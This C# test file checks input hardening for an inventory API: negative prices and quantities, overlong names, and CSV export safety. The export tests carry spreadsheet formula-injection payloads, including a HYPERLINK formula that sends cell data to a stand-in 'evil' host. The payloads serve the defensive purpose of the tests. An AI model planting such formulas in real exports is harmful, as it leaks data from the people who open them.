using System.Net;
using System.Net.Http.Json;
using Bodega.Platform.Tests.Infrastructure;

namespace Bodega.Platform.Tests;

/// <summary>
///     Hostile payloads aimed at the write endpoints: values that are the
///     wrong sign, longer than the column, or crafted to be interpreted as
///     something else once they leave the API (spreadsheet formulas in an
///     exported report).
///
///     Two separate concerns are asserted here. First, money and quantities
///     must never go negative — every one of those corrupts a real figure the
///     bodega owner reads. Second, a bad request must come back as a 4xx, not
///     a 500: a 500 means an exception escaped to the database layer, which is
///     both an availability problem and the shape of bug that leaks internals.
/// </summary>
[Collection(BodegaApiCollection.Name)]
public class InputHardeningTests(BodegaApiFactory factory) : IntegrationTestBase(factory)
{
    private static void AssertClientError(HttpResponseMessage response, string what)
    {
        Assert.True((int)response.StatusCode is >= 400 and < 500,
            $"{what} must be refused with a 4xx, got {(int)response.StatusCode} {response.StatusCode}");
    }

    // ---- Purchase orders: the money ledger with no validator of its own ----

    [Fact]
    public async Task PurchaseOrder_WithNegativeQuantity_IsRejected()
    {
        var client = await CreateBusinessAsync();
        var productId = await CreateProductAsync(client);
        var supplierId = await CreateSupplierAsync(client);

        var response = await CreatePurchaseOrderAsync(client, supplierId, productId, quantity: -50);
        AssertClientError(response, "a purchase order line with a negative quantity");
    }

    [Fact]
    public async Task PurchaseOrder_WithNegativeUnitPrice_IsRejected()
    {
        var client = await CreateBusinessAsync();
        var productId = await CreateProductAsync(client);
        var supplierId = await CreateSupplierAsync(client);

        var response = await CreatePurchaseOrderAsync(client, supplierId, productId, quantity: 10, unitPrice: -99m);
        AssertClientError(response, "a purchase order line with a negative unit price");
    }

    /// <summary>Discount is a 0..1 fraction; anything above 1 flips the line's subtotal negative.</summary>
    [Fact]
    public async Task PurchaseOrder_WithDiscountAboveOneHundredPercent_IsRejected()
    {
        var client = await CreateBusinessAsync();
        var productId = await CreateProductAsync(client);
        var supplierId = await CreateSupplierAsync(client);

        var response = await CreatePurchaseOrderAsync(client, supplierId, productId, quantity: 10, discount: 5m);
        AssertClientError(response, "a purchase order line with a 500% discount");
    }

    [Fact]
    public async Task PurchaseOrder_WithZeroQuantity_IsRejected()
    {
        var client = await CreateBusinessAsync();
        var productId = await CreateProductAsync(client);
        var supplierId = await CreateSupplierAsync(client);

        var response = await CreatePurchaseOrderAsync(client, supplierId, productId, quantity: 0);
        AssertClientError(response, "a purchase order line for zero units");
    }

    // ---- Products: no validator either ----

    [Fact]
    public async Task Product_WithNegativeBasePrice_IsRejected()
    {
        var client = await CreateBusinessAsync();

        var response = await CreateProductResponseAsync(client, basePrice: -100m);
        AssertClientError(response, "a product with a negative price");
    }

    [Fact]
    public async Task Product_WithAnEmptyName_IsRejected()
    {
        var client = await CreateBusinessAsync();

        var response = await CreateProductResponseAsync(client, name: "   ");
        AssertClientError(response, "a product with a blank name");
    }

    /// <summary>
    ///     name is varchar(150). A longer value must come back as a 400, not
    ///     reach MySQL and blow up as a 500 — the same class of defect the
    ///     previous audit fixed for an invalid RoleId.
    /// </summary>
    [Fact]
    public async Task Product_WithAnOverlongName_IsRejectedWithoutAServerError()
    {
        var client = await CreateBusinessAsync();

        var response = await CreateProductResponseAsync(client, name: new string('A', 5_000));
        AssertClientError(response, "a product whose name overflows its column");
    }

    [Fact]
    public async Task Product_WithABasePriceBeyondTheColumnRange_IsRejectedWithoutAServerError()
    {
        var client = await CreateBusinessAsync();

        // basePrice is decimal(10,2) — 8 integer digits at most.
        var response = await CreateProductResponseAsync(client, basePrice: 99_999_999_999m);
        AssertClientError(response, "a product price beyond the column's range");
    }

    /// <summary>An edit must not be able to put a product into a state a create would have refused.</summary>
    [Theory]
    [InlineData("", 10)]
    [InlineData("Arroz", -50)]
    public async Task ProductUpdate_WithInvalidFields_IsRejected(string name, decimal basePrice)
    {
        var client = await CreateBusinessAsync();
        var productId = await CreateProductAsync(client);

        var response = await client.PatchAsJsonAsync($"/api/v1/products/{productId}", new
        {
            name, description = "", category = "ABARROTES", basePrice
        });

        AssertClientError(response, $"a product edit with name '{name}' and price {basePrice}");
    }

    [Fact]
    public async Task Warehouse_WithAnEmptyName_IsRejected()
    {
        var client = await CreateBusinessAsync();

        var response = await client.PostAsJsonAsync("/api/v1/warehouses", new
        {
            name = "", code = "ALM-002", address = "", capacity = "MEDIUM"
        });

        AssertClientError(response, "a warehouse with a blank name");
    }

    [Fact]
    public async Task MinimumStock_CannotBeNegative()
    {
        var client = await CreateBusinessAsync();
        var productId = await CreateProductAsync(client);
        var warehouseId = await GetDefaultWarehouseIdAsync(client);
        (await RegisterStockIntakeAsync(client, productId, warehouseId, quantity: 5)).EnsureSuccessStatusCode();

        var response = await client.PatchAsJsonAsync($"/api/v1/inventories/{productId}/minimum-stock",
            new { minimumStock = -10 });

        AssertClientError(response, "a negative minimum-stock threshold");
    }

    // ---- Customers / suppliers ----

    [Fact]
    public async Task Customer_WithAnOverlongName_IsRejectedWithoutAServerError()
    {
        var client = await CreateBusinessAsync();

        var response = await client.PostAsJsonAsync("/api/v1/customers", new
        {
            fullName = new string('B', 5_000),
            documentNumber = "12345678",
            phoneNumber = "999111222",
            email = "cliente@test.local"
        });

        AssertClientError(response, "a customer whose name overflows its column");
    }

    [Fact]
    public async Task Supplier_WithAnOverlongName_IsRejectedWithoutAServerError()
    {
        var client = await CreateBusinessAsync();

        var response = await client.PostAsJsonAsync("/api/v1/suppliers", new
        {
            name = new string('C', 5_000),
            lastName = "Proveedor",
            ruc = "20123456789",
            email = "proveedor@test.local",
            phone = "999888777",
            address = "Av. Siempre Viva 742",
            contactPerson = "Contacto",
            category = "GRAINS"
        });

        AssertClientError(response, "a supplier whose name overflows its column");
    }

    // ---- Report export: what happens to the data after it leaves the API ----

    /// <summary>
    ///     CSV formula injection. A product name is free text written by any
    ///     WAREHOUSE employee; the CSV export is opened by the owner, in Excel.
    ///     A leading '=', '+', '-' or '@' makes the spreadsheet treat that cell
    ///     as a formula, so a name like =HYPERLINK("http://evil/?d="&amp;A1)
    ///     runs on the owner's machine when they open the export.
    ///
    ///     The exported field must therefore be quoted and neutralised, never
    ///     interpolated raw.
    /// </summary>
    [Theory]
    [InlineData("=HYPERLINK(\"http://evil.test\",\"click\")")]
    [InlineData("+1+1")]
    [InlineData("-1+1")]
    [InlineData("@SUM(A1:A9)")]
    public async Task ReportCsvExport_NeutralisesSpreadsheetFormulas(string hostileName)
    {
        var client = await CreateBusinessAsync();
        var productId = await CreateProductAsync(client, name: hostileName);
        var warehouseId = await GetDefaultWarehouseIdAsync(client);
        (await RegisterStockIntakeAsync(client, productId, warehouseId, quantity: 5)).EnsureSuccessStatusCode();

        var csv = await ExportCsvAsync(client, "INVENTORY");

        foreach (var line in csv.Split('\n').Skip(1).Where(line => !string.IsNullOrWhiteSpace(line)))
        {
            foreach (var field in SplitCsvFields(line))
            {
                Assert.False(field.Length > 0 && field[0] is '=' or '+' or '-' or '@',
                    $"exported CSV field starts with a formula character and will execute in a spreadsheet: {field}");
            }
        }
    }

    /// <summary>
    ///     A comma or a newline inside a product name must not be able to
    ///     invent extra columns or rows in the export — that silently corrupts
    ///     every figure to the right of it.
    /// </summary>
    [Fact]
    public async Task ReportCsvExport_QuotesSeparatorsInsideValues()
    {
        var client = await CreateBusinessAsync();
        var productId = await CreateProductAsync(client, name: "Arroz, costal 50kg");
        var warehouseId = await GetDefaultWarehouseIdAsync(client);
        (await RegisterStockIntakeAsync(client, productId, warehouseId, quantity: 5)).EnsureSuccessStatusCode();

        var csv = await ExportCsvAsync(client, "INVENTORY");

        var dataRows = csv.Split('\n').Skip(1).Where(line => !string.IsNullOrWhiteSpace(line)).ToList();
        Assert.NotEmpty(dataRows);

        // ProductId,ProductName,CurrentStock — exactly three fields, whatever the name contains.
        foreach (var row in dataRows)
            Assert.Equal(3, SplitCsvFields(row).Count);
    }

    private static async Task<string> ExportCsvAsync(HttpClient client, string type)
    {
        var generated = await client.PostAsJsonAsync("/api/v1/reports",
            new { type, dateFrom = (DateOnly?)null, dateTo = (DateOnly?)null });
        generated.EnsureSuccessStatusCode();
        var reportId = (await ReadJsonAsync(generated)).GetProperty("id").GetInt32();

        var export = await client.GetAsync($"/api/v1/reports/{reportId}/export");
        export.EnsureSuccessStatusCode();
        return await export.Content.ReadAsStringAsync();
    }

    /// <summary>Minimal RFC 4180 field splitter — enough to tell a quoted comma from a real separator.</summary>
    private static List<string> SplitCsvFields(string line)
    {
        var fields = new List<string>();
        var current = new System.Text.StringBuilder();
        var inQuotes = false;

        for (var index = 0; index < line.Length; index++)
        {
            var character = line[index];

            if (inQuotes)
            {
                if (character != '"') current.Append(character);
                else if (index + 1 < line.Length && line[index + 1] == '"') { current.Append('"'); index++; }
                else inQuotes = false;
            }
            else if (character == '"') inQuotes = true;
            else if (character == ',') { fields.Add(current.ToString()); current.Clear(); }
            else if (character != '\r') current.Append(character);
        }

        fields.Add(current.ToString());
        return fields;
    }
}
